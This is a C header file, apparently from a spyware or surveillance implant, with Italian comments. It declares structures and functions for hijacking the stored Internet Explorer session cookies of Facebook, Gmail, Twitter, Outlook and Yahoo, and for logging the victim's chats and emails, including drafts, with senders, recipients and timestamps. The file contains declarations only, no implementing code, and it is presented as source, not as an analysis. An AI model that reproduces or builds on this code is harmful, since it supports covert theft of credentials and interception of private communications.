#define SOCIAL_ENTRY_COUNT 8

#define SOCIAL_REQUEST_SUCCESS 0
#define SOCIAL_REQUEST_BAD_COOKIE 1
#define SOCIAL_REQUEST_NETWORK_PROBLEM 2

typedef unsigned long (*social_handler)(char *);

typedef struct {
	WCHAR domain[64];
	DWORD idle;
	BOOL wait_cookie;
	BOOL is_new_cookie;
	social_handler RequestHandler;
} SOCIAL_ENTRY;

#define FACEBOOK_DOMAIN L"facebook.com"
#define GMAIL_DOMAIN L"mail.google.com"
#define TWITTER_DOMAIN L"twitter.com"
#define OUTLOOK_DOMAIN L"live.com"
#define YAHOO_DOMAIN L"yahoo.com"

#define FACEBOOK_DOMAINA "facebook.com"
#define GMAIL_DOMAINA "mail.google.com"
#define TWITTER_DOMAINA "twitter.com"
#define OUTLOOK_DOMAINA "live.com"
#define YAHOO_DOMAINA "yahoo.com"

#define MAPI_V3_0_PROTO	2012030601

#pragma pack(4)
struct MailSerializedMessageHeader {
  DWORD VersionFlags;       // flags for parsing serialized message
#define MAIL_FULL_BODY 0x00000001 // Ha catturato tutta la mail 
#define MAIL_INCOMING  0x00000010
#define MAIL_OUTGOING  0x00000000
#define MAIL_DRAFT     0x00000100
  DWORD Flags;               // message flags
  DWORD Size;                // message size
  FILETIME date;			 // data di ricezione approssimativa del messaggio
 #define MAIL_GMAIL     0x00000000
 #define MAIL_OUTLOOK	0x00000004
 #define MAIL_YAHOO		0x00000006
  DWORD Program;
};
#pragma pack()

extern SOCIAL_ENTRY social_entry[SOCIAL_ENTRY_COUNT];
extern void urldecode(char *src);
extern void JsonDecode(char *string);
extern void CheckProcessStatus();
extern void LogSocialIMMessageA(DWORD program, char *peers, char *peers_id, char *author, char *author_id, char *body, struct tm *tstamp, BOOL is_incoming);
extern void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WCHAR *author, WCHAR *author_id, WCHAR *body, struct tm *tstamp, BOOL is_incoming);
extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);
extern void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming, BOOL is_draft);

extern char FACEBOOK_IE_COOKIE[1024];
extern char GMAIL_IE_COOKIE[1024];
extern char TWITTER_IE_COOKIE[1024];
extern char OUTLOOK_IE_COOKIE[1024];
extern char YAHOO_IE_COOKIE[1024];

#define CHAT_PROGRAM_FACEBOOK 0x02
#define CHAT_PROGRAM_TWITTER  0x03
#define CHAT_PROGRAM_YAHOO    0x0F




